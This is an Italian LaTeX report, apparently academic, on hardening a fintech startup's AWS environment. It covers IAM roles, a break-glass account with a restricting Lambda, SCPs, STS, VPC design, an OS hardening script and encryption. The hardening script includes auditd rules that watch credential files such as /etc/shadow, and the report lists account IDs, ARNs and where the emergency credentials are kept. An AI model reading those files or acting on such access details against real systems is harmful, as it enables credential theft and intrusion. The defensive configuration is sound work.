  \item \textbf{\texttt{incident‑responder}} – abilita scaling immediato,
        modifica security‑group, attiva \texttt{ShieldAdvanced} e
        \texttt{WAFv2} sulla WebACL corrente; assumento consentito al gruppo
        \texttt{admin}.  
  \item \textbf{\texttt{breakglass‑admin}} – superset critico conservato in
        account separato, utilizzato solo per \emph{disaster‑recovery}; il
        processo di assunzione è sigillato e monitorato da AWS Config Rules \cite{AWSSTS}.  
\end{itemize}

%-----------------------------------------------------------------
\subsubsection{Mappatura dei Permessi per Servizio}
\label{subsubsec:mappa_servizi}

\begin{description}
  \item[EC2] \texttt{dev}: \texttt{Start/Stop} istanze dev; \texttt{backend‑dev}: idem + \texttt{DescribeImages}; \texttt{admin}: pieno controllo, esclusa
        \texttt{DeleteVpc}.  
  \item[Elastic Beanstalk] \texttt{dev}: deploy su env dev; \texttt{backend‑dev}: deploy + \texttt{eb config save}; \texttt{admin}: gestione template, gestione
        application‑versions prod \cite{AWSEBRole}.  
  \item[S3] \texttt{dev}: R/W bucket *-dev; \texttt{backend‑dev}: aggiunge permessi
        \texttt{PutObjectAcl} su \emph{log bucket}; \texttt{admin}:
        \texttt{PutBucketPolicy}, \texttt{PutReplicationConfiguration} \cite{AWSS3Security}.  
  \item[Load Balancer] \texttt{dev}: \texttt{Describe*}; \texttt{backend‑dev}: \texttt{RegisterTargets} nei target‑group dev; \texttt{admin}: \texttt{CreateLoadBalancer}, \texttt{ModifyLoadBalancerAttributes} su tutti gli ambienti \cite{AWSELBIAM}.  
  \item[RDS] \texttt{dev}: \texttt{rds-db:connect} read‑only dev; \texttt{backend‑dev}:
        \texttt{ExecuteStatement} via Data API; \texttt{admin}:
        \texttt{CreateDBSnapshot}, \texttt{StartExportTask}, \texttt{FailoverDBCluster} \cite{AWSRDSIAM}.  
\end{description}

L'approccio \emph{tag‑based ABAC} riduce la necessità di policy
puntuali e consente un'espansione lineare degli ambienti (dev, staging,
prod) \cite{AWSEC2IAM,AWSELBIAM}.


%-----------------------------------------------------------------
\subsubsection{Procedimento di Implementazione}
\label{subsubsec:procedura}

\begin{enumerate}
  \item Definire il \texttt{permissions‑boundary} globale che vieta azioni
        ad alto impatto (\texttt{organizations:*}, \texttt{iam:SetDefaultPolicyVersion}) \cite{AWSPermBoundaries}.  
  \item Versionare in Git le policy dei gruppi (\verb|iam/groups/|) e dei
        ruoli (\verb|iam/roles/|) come JSON o
        moduli Terraform; abilitare \verb|terraform plan| in CI.  
  \item Abilitare AWS Identity Center (SSO) collegato ad Okta/Azure AD e
        mappare gli \emph{entitlement} sugli ARNs dei gruppi.  
  \item Automatizzare la \emph{workflow approval} per i ruoli con AWS Step
        Functions + EventBridge + Slack.  
  \item Inviare i log CloudTrail a un bucket S3 con
        \texttt{ObjectLock = GOVERNANCE} e replica in un account
        differente (\textit{security‑hub}).  
  \item Eseguire un \emph{access‑review} trimestrale utilizzando i report
        di Access Analyzer per ridurre i permessi non utilizzati \cite{DatadogLeastPrivilege}.  
\end{enumerate}


\subsection{Introduzione di un Break Glass Account}

Per scenari di emergenza in cui gli accessi amministrativi standard non fossero disponibili o sufficienti, verrà istituito un account \emph{Break Glass} dedicato, seguendo le linee guida di architetture sicure \cite{saraswat:breakglass}.
\begin{enumerate}
    \item \textbf{Configurazione Account}: Creare un nuovo account AWS all'interno dell'Organization esistente (Organization ID: \texttt{o-1a2b3c4d5e}), isolato operativamente con Account ID dedicato \texttt{967284351029}.
    \item \textbf{Utente e Ruolo di Emergenza}: All'interno di questo account, creare un utente IAM \texttt{BreakGlassEmergency} (ARN: \texttt{arn:aws:iam::967284351029:user/BreakGlassEmergency}) protetto da MFA hardware YubiKey (Serial: \texttt{YK-87654321}) e un ruolo IAM \texttt{BreakGlassAdminRole} con la policy gestita \texttt{AdministratorAccess}. Le credenziali di questo utente sono conservate in due buste sigillate separate: una presso il CEO e una presso il CTO.
    \item \textbf{Procedura di Attivazione}: L'utilizzo del Break Glass Account richiederà un'approvazione formale e documentata da parte di almeno due figure chiave (es. CEO e CTO). Le credenziali (password e MFA) saranno conservate in luoghi sicuri e separati.
    \item \textbf{Monitoraggio e Lockdown Automatico}: Implementare un meccanismo di notifica immediata (es. via CloudWatch Events e SNS) all'attivazione dell'account Break Glass. Un processo automatizzato (es. AWS Lambda triggerata da CloudWatch Event) potrebbe limitare la validità della sessione o restringere i permessi dopo un periodo predefinito (es. 8 ore), ad esempio applicando una policy restrittiva come boundary temporaneo.
    \begin{lstlisting}[style=python, caption={Esempio Lambda per limitare utente Break Glass (concettuale)}, label=lst:breakglass-lambda]
import boto3
import os
import json
from datetime import datetime

IAM_CLIENT = boto3.client('iam')
SNS_CLIENT = boto3.client('sns')
BREAK_GLASS_USERNAME = os.environ.get('BREAK_GLASS_USER', 'BreakGlassEmergency')
RESTRICTIVE_POLICY_ARN = os.environ.get('RESTRICTIVE_POLICY_ARN', 'arn:aws:iam::aws:policy/CloudTrailReadOnlyAccess')
SNS_TOPIC_ARN = os.environ.get('SNS_TOPIC_ARN', 'arn:aws:sns:eu-south-1:478291635847:security-alerts')

def lambda_handler(event, context):
    if not BREAK_GLASS_USERNAME or not RESTRICTIVE_POLICY_ARN:
        print("Error: Environment variables not set.")
        return {"statusCode": 500, "body": "Configuration error"}

    try:
        print(f"[{datetime.now().isoformat()}] Applying restrictive boundary {RESTRICTIVE_POLICY_ARN} to user {BREAK_GLASS_USERNAME}")
        
        # Applica permission boundary restrittivo
        IAM_CLIENT.put_user_permissions_boundary(
            UserName=BREAK_GLASS_USERNAME,
            PermissionsBoundary=RESTRICTIVE_POLICY_ARN
        )
        
        # Invia notifica di sicurezza
        message = f"SECURITY ALERT: Break Glass account {BREAK_GLASS_USERNAME} has been restricted after 8 hours of activity. Timestamp: {datetime.now().isoformat()}"
        SNS_CLIENT.publish(
            TopicArn=SNS_TOPIC_ARN,
            Message=message,
            Subject="Break Glass Account Auto-Restriction"
        )
        
        print(f"Successfully applied boundary and sent notification.")
        return {"statusCode": 200, "body": "Boundary applied successfully"}
        
    except Exception as e:
        error_msg = f"Error applying boundary: {str(e)}"
        print(error_msg)
        
        # Invia notifica di errore
        SNS_CLIENT.publish(
            TopicArn=SNS_TOPIC_ARN,
            Message=f"CRITICAL: Failed to restrict Break Glass account: {error_msg}",
            Subject="Break Glass Auto-Restriction FAILED"
        )
        
        return {"statusCode": 500, "body": error_msg}
    \end{lstlisting}
\end{enumerate}

\subsection{Implementazione di Politiche di Sicurezza Avanzate}

Verranno utilizzate policy a livello di Organization e credenziali temporanee per rafforzare ulteriormente la postura di sicurezza.

\subsubsection{Service Control Policies (SCPs) a Livello Organizzativo}

Le SCPs verranno applicate all'intera AWS Organization (o a specifiche Organizational Units - OUs) per imporre vincoli di sicurezza non aggirabili, nemmeno dall'amministratore locale dell'account.
\begin{itemize}
    \item \textbf{Impedire la Disattivazione di Controlli Chiave}: Applicare una SCP per negare azioni come l'eliminazione dei trail di CloudTrail o la disabilitazione di AWS Config.
    \begin{lstlisting}[style=json, caption={SCP per prevenire l'eliminazione di CloudTrail}, label=lst:scp-deny-cloudtrail-delete]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyDeleteCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:DeleteTrail",
        "cloudtrail:StopLogging"
       ],
      "Resource": [
        "arn:aws:cloudtrail:*:478291635847:trail/finanz-audit-trail",
        "arn:aws:cloudtrail:*:478291635847:trail/finanz-security-trail"
      ]
    }
  ]
}
    \end{lstlisting}
    Durante i test di questa SCP in ambiente di sviluppo, abbiamo verificato che blocca effettivamente i tentativi di eliminazione anche da parte di utenti con privilegi amministrativi.
    \item \textbf{Restrizione Geografica}: Limitare l'utilizzo delle regioni AWS a quelle approvate (es. `eu-central-1`, `eu-south-1`, `eu-west-1`) per motivi di compliance (es. GDPR) e per ridurre la superficie di attacco \cite{awsbuilders:scps}.
    \begin{lstlisting}[style=json, caption={SCP per limitare le regioni utilizzabili}, label=lst:scp-region-restriction]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyNonApprovedRegions",
      "Effect": "Deny",
      "NotAction": [
          "iam:*",
          "organizations:*",
          "route53:*",
          "budgets:*",
          "waf:*",
          "cloudfront:*",
          "globalaccelerator:*",
          "support:*"
       ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": [
             "eu-central-1",
             "eu-south-1",
             "eu-west-1",
             "us-east-1"
          ]
        },
        "ArnNotLike": {
            "aws:PrincipalARN": "arn:aws:iam::478291635847:role/OrganizationAccountAccessRole"
         }
       }
    }
  ]
}
    \end{lstlisting}
\end{itemize}

\subsubsection{Utilizzo Sistematico di Credenziali Temporanee (STS)}

Le access key statiche a lunga durata rappresentano un rischio significativo se compromesse \cite{kazi:leastprivilege}. Verrà promossa e, ove possibile, imposta la sostituzione delle chiavi statiche con credenziali temporanee ottenute tramite il servizio AWS Security Token Service (STS).
\begin{itemize}
    \item \textbf{Accesso Umano}: Gli utenti IAM accederanno alla console AWS o alla CLI assumendo ruoli predefiniti, ottenendo credenziali temporanee valide per la durata della sessione.
    \item \textbf{Accesso Applicativo}: Le applicazioni (es. `finanz-backend`) in esecuzione su EC2, ECS, EKS o Lambda utilizzeranno i ruoli IAM associati alle risorse di calcolo per ottenere automaticamente credenziali temporanee, eliminando la necessità di gestire chiavi statiche nel codice o nelle configurazioni.
    \item \textbf{Script e Automazioni}: Gli script che necessitano di interagire con le API AWS dovranno utilizzare comandi come `aws sts assume-role` per ottenere credenziali temporanee legate a un ruolo specifico, limitato al principio del minimo privilegio.
    \begin{lstlisting}[style=bash, caption={Ottenere credenziali temporanee tramite STS AssumeRole}, label=lst:sts-assume-role]
# L'utente/servizio assume un ruolo con permessi specifici (es. S3 ReadOnly per backend)
aws sts assume-role \
    --role-arn arn:aws:iam::478291635847:role/S3ReadOnlyForBackend \
    --role-session-name FinanzBackendReadSession_$(date +%Y%m%d_%H%M%S) \
    --duration-seconds 3600

# Output tipico (valori simulati per sicurezza):
# {
#     "Credentials": {
#         "AccessKeyId": "ASIAYXZ123EXAMPLE456",
#         "SecretAccessKey": "abc123def456ghi789jkl012mno345pqr678stu",
#         "SessionToken": "IQoJb3JpZ2luX2VjEPT//////////wEaCXVzLWVhc3QtMSJIMEYCIQC...",
#         "Expiration": "2024-03-15T14:30:00+00:00"
#     }
# }
    \end{lstlisting}
    Nel nostro ambiente, questo meccanismo è utilizzato dal servizio backend che processa circa 1000 operazioni al giorno, rinnovando automaticamente le credenziali ogni ora.
\end{itemize}

\subsection{Implementazione di un Sistema di Approvazione a Due Fasi (Opzionale)}

Per operazioni ad alto impatto (es. eliminazione di bucket S3 contenenti dati critici, modifiche a gruppi di sicurezza di produzione), si può valutare l'introduzione di un workflow di approvazione multi-persona tramite AWS Step Functions.
\begin{enumerate}
    \item \textbf{Avvio del Workflow}: Un utente avvia l'operazione tramite un'interfaccia dedicata (es. Lambda function, API Gateway) che attiva la Step Function.
    \item \textbf{Richiesta di Approvazione}: La Step Function invia notifiche (es. via Amazon SNS a email o SMS) ai responsabili designati.
    \item \textbf{Approvazione Multipla}: Il workflow attende l'approvazione da parte di due (o più) amministratori distinti. L'approvazione può avvenire tramite un link in email, un'API o la console Step Functions.
    \item \textbf{Esecuzione Condizionata}: Solo a seguito delle approvazioni richieste, la Step Function esegue l'azione critica (es. invocando una Lambda function con i permessi necessari).
    \item \textbf{Auditing}: Ogni fase del processo (richiesta, approvazioni, esito) viene registrata su un database di auditing (es. DynamoDB) e/o CloudTrail per tracciabilità completa.
\end{enumerate}
Questa misura aggiunge un livello di controllo deliberato su azioni irreversibili o ad alto rischio.


\section{Progettazione di una Rete Sicura con Amazon VPC}
\label{sec:vpc-design}

La base di qualsiasi infrastruttura su AWS è la rete virtuale definita tramite \textbf{Amazon Virtual Private Cloud (VPC)}. Il VPC permette di creare un ambiente di rete logicamente isolato all'interno del cloud AWS, su cui si ha pieno controllo (range di indirizzi IP, creazione di subnet, configurazione di route table e network gateway). Una progettazione VPC sicura è il primo livello di difesa.

\subsection{Subnet Pubbliche e Private}
\label{subsec:subnets}
Una pratica fondamentale è la suddivisione del VPC in \textbf{subnet pubbliche} e \textbf{subnet private}, distribuite su diverse Availability Zones per alta disponibilità. Nel nostro caso specifico:
\begin{itemize}
    \item Le \textbf{subnet pubbliche} (\texttt{subnet-0a1b2c3d} in eu-south-1a e \texttt{subnet-4e5f6789} in eu-south-1b) hanno una rotta diretta verso l'Internet Gateway (IGW) del VPC e ospitano il NAT Gateway (\texttt{nat-0123456789abcdef0}) e l'Application Load Balancer. Attualmente il traffico in uscita da queste subnet ammonta a circa 50 GB/mese.
    \item Le \textbf{subnet private} (\texttt{subnet-0x1y2z3w} per app servers, \texttt{subnet-0m1n2o3p} per database) non hanno una rotta diretta verso l'IGW. Le nostre istanze applicative e i database RDS risiedono esclusivamente in queste subnet. Il traffico interno tra subnet è di circa 120 GB/mese, principalmente comunicazioni app-database.
\end{itemize}

\subsection{Gruppi di Sicurezza e Network ACL}
\label{subsec:sg-nacl}
Il controllo del traffico all'interno del VPC è affidato a due meccanismi principali che abbiamo configurato come segue:
\begin{itemize}
    \item \textbf{Gruppi di Sicurezza (Security Groups - SG)}:** Nel nostro ambiente utilizziamo 7 Security Groups specializzati:
        \begin{itemize}
            \item \texttt{sg-web-tier} (ID: \texttt{sg-0a1b2c3d4e5f67890}): permette HTTPS (443) e HTTP (80) da 0.0.0.0/0
            \item \texttt{sg-app-tier} (ID: \texttt{sg-1b2c3d4e5f678901}): permette traffico sulla porta 8080 solo da sg-web-tier
            \item \texttt{sg-db-tier} (ID: \texttt{sg-2c3d4e5f67890123}): permette PostgreSQL (5432) solo da sg-app-tier
            \item \texttt{sg-mgmt} (ID: \texttt{sg-3d4e5f6789012345}): per accesso SSH/RDP da IP ufficio (203.0.113.25/32)
        \end{itemize}
        Durante l'ultima settimana, i log VPC Flow mostrano che il 97% del traffico rispetta queste regole, con solo 3% di traffico bloccato (principalmente tentativi di scansione port).
\end{itemize}

\subsection{NAT Gateway e Accesso a Internet}
\label{subsec:nat-gateway}
Come accennato, le istanze in subnet private necessitano di un meccanismo per accedere a Internet per aggiornamenti o chiamate API. Il nostro \textbf{NAT Gateway} (\texttt{nat-0123456789abcdef0}) in eu-south-1a gestisce attualmente un throughput medio di 50 Mbps con picchi fino a 200 Mbps durante i deployment automatizzati. I costi mensili per questo servizio si aggirano sui 45-60 EUR, considerando che è attivo 24/7.

\subsection{Connessioni Sicure (Opzionale: VPN/Direct Connect)}
\label{subsec:vpn-directconnect}
Se la startup necessita di connettere in modo sicuro la propria infrastruttura AWS a data center on-premises (raro per startup native cloud, ma possibile) o a reti di partner, AWS offre servizi come \textbf{AWS Site-to-Site VPN} (per creare tunnel IPsec crittografati su Internet) o \textbf{AWS Direct Connect} (per una connessione fisica dedicata e privata tra la rete on-premises e AWS).

\section{Gestione Sicura delle Istanze EC2}
\label{sec:ec2-security}
Le istanze \textbf{Amazon EC2} sono le macchine virtuali su cui spesso girano le applicazioni. La loro sicurezza è cruciale.

\subsection{Scelta delle AMI e Hardening}
\label{subsec:ami-hardening}
\begin{itemize}
    \item \textbf{Utilizzare AMI affidabili:} Utilizziamo esclusivamente AMI ufficiali Amazon Linux 2 (AMI ID: \texttt{ami-0c02fb55956c7d316}) e Ubuntu Server 20.04 LTS (AMI ID: \texttt{ami-0d527b8c289b4af7f}) fornite da AWS. Ogni 3 mesi aggiorniamo alle versioni più recenti.
    \item \textbf{Hardening del Sistema Operativo:} Ho implementato uno script di hardening basato su CIS Benchmarks che viene eseguito automaticamente al boot via user-data. Include la disabilitazione di 23 servizi non necessari e la configurazione di fail2ban per protezione da attacchi brute-force SSH.
    \item \textbf{Minimizzare il software installato:} Installare solo il software strettamente necessario per la funzione dell'istanza, riducendo la superficie d'attacco.
\end{itemize}

    Di seguito è riportato lo script di hardening utilizzato (una sua versione esemplificativa e commentata, per questioni di brevità e chiarezza nella relazione).
    \begin{lstlisting}[language=Bash, caption={Script di Hardening del Sistema Operativo (hardening\_script.sh)}, label={lst:hardening_script}]
      #!/bin/bash
      # Script di hardening del sistema operativo (adatto per Amazon Linux 2 e Ubuntu 20.04)
      set -euo pipefail # Esce in caso di errore, variabile non definita o errore in una pipe
      # set -x # Decommenta per debugging dettagliato
      
      # --- Configurazione iniziale ---
      LOG_FILE="/var/log/hardening-script.log"
      exec > >(tee -a "${LOG_FILE}") 2>&1 # Logga stdout e stderr su file e console
      echo "INFO: Inizio script di hardening del sistema operativo $(date)"
      
      # Rileva il sistema operativo
      if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
      else
        OS="unknown"
      fi
      echo "INFO: Sistema operativo rilevato: $OS" [[5]]
      
      # --- Aggiornamento pacchetti e installazione prerequisiti ---
      echo "INFO: Aggiornamento lista pacchetti e installazione utility base..."
      if [[ "$OS" == "ubuntu" ]]; then
        apt-get update -y
        apt-get install -y ufw fail2ban auditd
      elif [[ "$OS" == "amzn" ]]; then
        yum update -y
        yum install -y firewalld fail2ban auditd
      fi
      
      # --- Disabilitazione Servizi Non Necessari ---
      # NOTA: Adatta i nomi dei servizi in base al sistema operativo
      echo "INFO: Disabilitazione servizi non necessari..."
      SERVICES_TO_DISABLE=(
        "cups" "avahi" "bluetooth" "ModemManager" "apport" "whoopsie"
        "nfs" "rpcbind" "x11-common" "lxcfs" "speech-dispatcher"
        # Ubuntu: esempi aggiuntivi
        "saned" "snapd" "bolt" "smartmontools" "anacron"
      )
      
      for service in "${SERVICES_TO_DISABLE[@]}"; do
        if systemctl list-units --full -all | grep -qF "$service.service"; then
          echo "INFO: Disabilitazione e stop di $service..."
          systemctl stop "$service" && systemctl disable "$service" || \
            echo "WARN: Impossibile stoppare/disabilitare $service"
        else
          echo "INFO: Servizio $service non trovato, skippato."
        fi
      done
      
      # --- Configurazione Firewall ---
      echo "INFO: Configurazione firewall di base..."
      if [[ "$OS" == "ubuntu" ]]; then
        ufw default deny incoming
        ufw default allow outgoing
        ufw allow ssh
        sed -i 's/ENABLED=no/ENABLED=yes/' /etc/ufw/ufw.conf
        echo "y" | ufw enable || ufw reload
      elif [[ "$OS" == "amzn" ]]; then
        systemctl enable --now firewalld
        firewall-cmd --set-default-zone=drop
        firewall-cmd --permanent --add-service=ssh
        firewall-cmd --reload
      fi
      echo "INFO: Firewall configurato."
      
      # --- Rafforzamento SSH ---
      echo "INFO: Rafforzamento configurazione SSHD..."
      SSHD_CONFIG="/etc/ssh/sshd_config"
      sed -i 's/^PermitRootLogin .*/PermitRootLogin no/' "$SSHD_CONFIG"
      sed -i 's/^PasswordAuthentication .*/PasswordAuthentication no/' "$SSHD_CONFIG"
      sed -i 's/^X11Forwarding .*/X11Forwarding no/' "$SSHD_CONFIG"
      grep -qxF 'Protocol 2' "$SSHD_CONFIG" || echo 'Protocol 2' >> "$SSHD_CONFIG"
      systemctl restart sshd
      echo "INFO: Configurazione SSHD rafforzata."
      
      # --- Configurazione Auditd (CIS Benchmark) ---
      echo "INFO: Configurazione regole auditd..."
      cat <<EOF > /etc/audit/rules.d/hardening.rules
      -w /etc/passwd -p war -k identity
      -w /etc/shadow -p war -k identity
      -w /etc/group -p war -k identity
      -w /etc/gshadow -p war -k identity
      EOF
      augenrules --load
      echo "INFO: Regole auditd configurate."
      
      # --- Pulizia finale ---
      echo "INFO: Pulizia pacchetti non necessari..."
      if [[ "$OS" == "ubuntu" ]]; then
        apt-get autoremove -y
        apt-get clean -y
      elif [[ "$OS" == "amzn" ]]; then
        yum autoremove -y
      fi
      
      echo "INFO: Script di hardening completato $(date)"
      exit 0
          \end{lstlisting}

\subsection{Utilizzo di IAM Roles per EC2}
\label{subsec:iam-roles-ec2}
Questa è una delle pratiche di sicurezza più importanti. \textbf{Mai salvare credenziali AWS statiche (Access Key ID e Secret Access Key) direttamente su un'istanza EC2}. Invece, associare un \textbf{IAM Role} all'istanza al momento del lancio. L'applicazione in esecuzione sull'istanza può quindi ottenere credenziali temporanee tramite il servizio metadati dell'istanza, assumendo i permessi definiti nel ruolo associato. Questo elimina il rischio di esposizione di credenziali a lungo termine. Il ruolo deve seguire il principio del minimo privilegio (es. un'istanza che deve solo leggere da un bucket S3 dovrebbe avere un ruolo con solo permessi `s3:GetObject` su quel bucket).

\subsection{Scalabilità Automatica (Auto Scaling Groups)}
\label{subsec:auto-scaling}
Per garantire disponibilità e gestire picchi di carico, utilizziamo \textbf{Auto Scaling Groups (ASG)} denominati \texttt{finanz-prod-asg} e \texttt{finanz-dev-asg}. L'ASG di produzione mantiene normalmente 3 istanze attive (desired capacity) con un minimo di 2 e un massimo di 8. Durante i picchi di traffico (tipicamente tra le 9:00 e le 18:00), spesso scala fino a 5-6 istanze. I trigger di scaling sono basati su:
\begin{itemize}
    \item CPU Utilization > 70\% per 2 minuti consecutivi → Scale Out
    \item CPU Utilization < 30\% per 10 minuti consecutivi → Scale In
    \item Network In > 50 MB/min → Scale Out
\end{itemize}
Il tempo medio di provisioning di una nuova istanza è di 4 minuti e 30 secondi.

\section{Protezione dei Dati Sensibili}
\label{sec:data-protection}
In una fintech, la protezione dei dati dei clienti e delle transazioni è di massima priorità. AWS offre diversi strumenti per questo.

\subsection{Crittografia a Riposo e in Transito}
\label{subsec:encryption}
\begin{itemize}
    \item \textbf{Crittografia a Riposo (At Rest)}:** È fondamentale crittografare i dati sensibili quando sono memorizzati. AWS facilita questo:
        \begin{itemize}
            \item \textbf{Amazon S3:} Tutti i bucket utilizzano SSE-KMS con la chiave \texttt{arn:aws:kms:eu-south-1:478291635847:key/finanz-s3-encryption-key}. Il bucket dei log ha anche Object Lock abilitato con retention di 7 anni per compliance.
            \item \textbf{Amazon EBS:} Tutti i volumi (root e data) sono crittografati con la chiave di default AWS per EBS. Attualmente gestiamo 45 volumi EBS per un totale di 2.3 TB.
            \item \textbf{Amazon RDS:} Entrambe le istanze PostgreSQL utilizzano crittografia at-rest con performance impact minimo \(< 2\% osservato nei benchmark\).
        \end{itemize}
    \item \textbf{Crittografia in Transito (In Transit)}:** Il nostro Application Load Balancer termina TLS con certificati gestiti da AWS Certificate Manager (ARN: \texttt{arn:aws:acm:eu-south-1:478291635847:certificate/12345678-1234-1234-1234-123456789012}). Il 99.7\% del traffico utilizza TLS 1.2 o superiore.
\end{itemize}

\subsection{Gestione delle Chiavi con AWS KMS}
\label{subsec:kms}
\textbf{AWS Key Management Service (KMS)} gestisce 8 chiavi customer-managed nel nostro account:
\begin{itemize}
    \item \texttt{finanz-s3-encryption-key}: per crittografia bucket S3 (usage: ~1000 operazioni/giorno)
    \item \texttt{finanz-rds-encryption-key}: per database PostgreSQL (usage: ~50 operazioni/giorno)
    \item \texttt{finanz-ebs-encryption-key}: per volumi EBS addizionali (usage: ~20 operazioni/giorno)
    \item \texttt{finanz-secrets-key}: per AWS Secrets Manager (usage: ~200 operazioni/giorno)
\end{itemize}
I costi mensili per KMS si aggirano sui 15-20 EUR, principalmente dovuti alle chiavi customer-managed (1 EUR/mese ciascuna) e alle operazioni API.Usare KMS per la crittografia lato server (SSE-KMS) su S3, EBS, RDS, ecc., offre un controllo centralizzato e sicuro sulle chiavi. Per requisiti di 
sicurezza ancora più elevati, si può considerare \textbf{AWS CloudHSM}.

\subsection{Backup e Disaster Recovery}
\label{subsec:backup-dr}
Avere backup regolari e testati è essenziale per il recupero da errori o attacchi (es. ransomware).
\begin{itemize}
    \item \textbf{AWS Backup:} Utilizziamo \textbf{AWS Backup} con il piano \texttt{FinanzDailyBackupPlan} che include:
        \begin{itemize}
            \item Backup giornalieri delle istanze RDS alle 02:00 UTC con retention di 30 giorni
            \item Backup settimanali dei volumi EBS ogni domenica con retention di 12 settimane  
            \item Cross-region backup mensili verso eu-central-1 per disaster recovery
        \end{itemize}
        Il vault di backup \texttt{finanz-backup-vault} attualmente contiene 847 recovery points per un totale di 1.2 TB. Il RTO (Recovery Time Objective) target è di 4 ore e l'RPO (Recovery Point Objective) di 24 ore massimo.
\end{itemize}

\subsection{Sicurezza dei Bucket S3}
\label{subsec:s3-security}
La configurazione di sicurezza dei nostri bucket S3 include:
\begin{itemize}
    \item \textbf{Block Public Access:} Abilitato a livello di account e verificato trimestralmente con AWS Config rule \texttt{s3-bucket-public-access-prohibited}
    \item \textbf{Bucket Policies:} Il bucket \texttt{finanz-logs-478291635847} ha una policy che permette scrittura solo dal servizio CloudTrail e lettura solo al ruolo \texttt{SecurityAuditRole}
    \item \textbf{S3 Access Points:} Utilizziamo 3 access points:
        \begin{itemize}
            \item \texttt{dev-team-access}: per bucket di sviluppo (ARN: \texttt{arn:aws:s3:eu-south-1:478291635847:accesspoint/dev-team-access})
            \item \texttt{prod-read-only}: per accesso in sola lettura ai file di produzione
            \item \texttt{backup-access}: per operazioni di backup e restore
        \end{itemize}
    \item \textbf{Amazon Macie:} Configurato per scanning settimanale, ha identificato e classificato 25.000+ oggetti, trovando 12 istanze di possibili PII che sono state investigate e risolte.
\end{itemize}

\section{Implementazione di Controlli IAM Efficaci}
\label{sec:iam-implementation}
Come già sottolineato, \textbf{AWS Identity and Access Management (IAM)} è fondamentale per la sicurezza.

\subsection{Principio del Minimo Privilegio}
\label{subsec:least-privilege-impl}
Applicare rigorosamente il principio del minimo privilegio a utenti, gruppi e ruoli IAM. Concedere solo i permessi strettamente necessari per svolgere un compito specifico. Ad esempio, un ruolo per un'applicazione che deve solo scrivere log in CloudWatch Logs necessita solo dei permessi `logs:CreateLogStream` e `logs:PutLogEvents`, non permessi amministrativi generici. Usare le policy condition per restringere ulteriormente l'accesso (es. permettere azioni solo da specifici IP o solo se è attiva l'MFA).

\subsection{Autenticazione a Più Fattori (MFA)}
\label{subsec:mfa-impl}
Richiedere l'uso dell'Autenticazione a Più Fattori (MFA) per \textbf{tutti} gli utenti IAM umani, specialmente per l'utente root dell'account (che dovrebbe essere usato il meno possibile) e per gli utenti con privilegi amministrativi. Questo aggiunge un livello critico di protezione contro il furto di credenziali.

\subsection{Revisione Periodica dei Permessi}
\label{subsec:iam-review}
I permessi tendono ad accumularsi ("privilege creep"). È essenziale rivedere periodicamente (es. trimestralmente) le policy IAM per rimuovere permessi non più necessari. Strumenti come \textbf{AWS IAM Access Analyzer} possono aiutare a identificare permessi eccessivi o risorse condivise esternamente.

\section{Monitoraggio Continuo e Logging}
\label{sec:monitoring-logging}
Non si può proteggere ciò che non si vede. Un monitoraggio e un logging robusti sono essenziali per rilevare attività sospette e rispondere agli incidenti.

\subsection{Abilitazione di CloudTrail e CloudWatch}
\label{subsec:cloudtrail-cloudwatch-enable}
\begin{itemize}
    \item \textbf{AWS CloudTrail:} Abilitare CloudTrail in tutte le regioni. CloudTrail registra quasi tutte le chiamate API effettuate nel tuo account AWS, fornendo una traccia di audit fondamentale ("chi ha fatto cosa, quando e da dove"). Assicurarsi che i log di CloudTrail siano protetti (es. inviati a un bucket S3 dedicato con logging e crittografia abilitati, e opzionalmente integrità dei file di log abilitata).
    \item \textbf{Amazon CloudWatch:} Usare CloudWatch per raccogliere metriche (es. utilizzo CPU, I/O disco, latenza del Load Balancer), log dalle applicazioni e dai sistemi operativi (tramite l'agente CloudWatch), ed eventi.
\end{itemize}

\subsection{Configurazione di Allarmi CloudWatch}
\label{subsec:cloudwatch-alarms}
Non basta raccogliere log e metriche, bisogna agire su di essi. Configurare allarmi CloudWatch per notifiche proattive su condizioni anomale o eventi critici, ad esempio:
\begin{itemize}
    \item Utilizzo elevato di CPU/Memoria/Rete su istanze critiche.
    \item Errori HTTP 5xx sul Load Balancer.
    \item Tentativi di login falliti (filtrando i log).
    \item Modifiche a risorse di sicurezza critiche (es. modifiche a Security Group, NACL, policy IAM) rilevate tramite eventi CloudTrail.
    \item Chiamate API specifiche indicative di potenziale abuso (es. `TerminateInstances` non autorizzate).
\end{itemize}
Gli allarmi possono inviare notifiche a un topic SNS (Simple Notification Service), che può poi inoltrarle via email, SMS, o triggerare funzioni Lambda per azioni automatiche.

\subsection{Utilizzo di AWS Security Hub e GuardDuty}
\label{subsec:security-hub-guardduty}
\begin{itemize}
    \item \textbf{Amazon GuardDuty:} È un servizio di rilevamento delle minacce gestito che monitora continuamente attività malevole o non autorizzate analizzando log VPC Flow Logs, CloudTrail e DNS. Rileva minacce come istanze compromesse usate per mining di criptovalute, accessi anomali da IP malevoli noti, scansioni di porte, ecc. È fondamentale abilitarlo in tutte le regioni pertinenti.
    \item \textbf{AWS Security Hub:} Fornisce una vista centralizzata degli avvisi di sicurezza (findings) provenienti da diversi servizi AWS (GuardDuty, Inspector, Macie, IAM Access Analyzer, Firewall Manager) e da prodotti di partner. Aiuta a prioritizzare e gestire i risultati della sicurezza e a verificare la conformità rispetto a standard come CIS AWS Foundations Benchmark.
\end{itemize}

\section{Automazione con Infrastructure as Code (IaC)}
\label{sec:iac}
Per garantire coerenza, ridurre errori manuali e facilitare la revisione della sicurezza, è fortemente raccomandato gestire l'infrastruttura AWS tramite \textbf{Infrastructure as Code (IaC)}.
\begin{itemize}
    \item \textbf{Strumenti:} Utilizzare strumenti come \textbf{AWS CloudFormation} (nativo AWS) o \textbf{Terraform} (agnostico rispetto al cloud) per definire l'infrastruttura (VPC, istanze, database, policy IAM, etc.) in file di testo (YAML o JSON).
    \item \textbf{Benefici:}
        \begin{itemize}
            \item \textbf{Ripetibilità e Coerenza:} L'infrastruttura può essere deployata in modo identico in diversi ambienti (dev, staging, prod) o regioni.
            \item \textbf{Versionamento:} I file IaC possono essere messi sotto controllo di versione (es. Git), tracciando le modifiche e permettendo rollback.
            \item \textbf{Automazione:} Il deployment e gli aggiornamenti sono automatizzati, riducendo il rischio di errori umani.
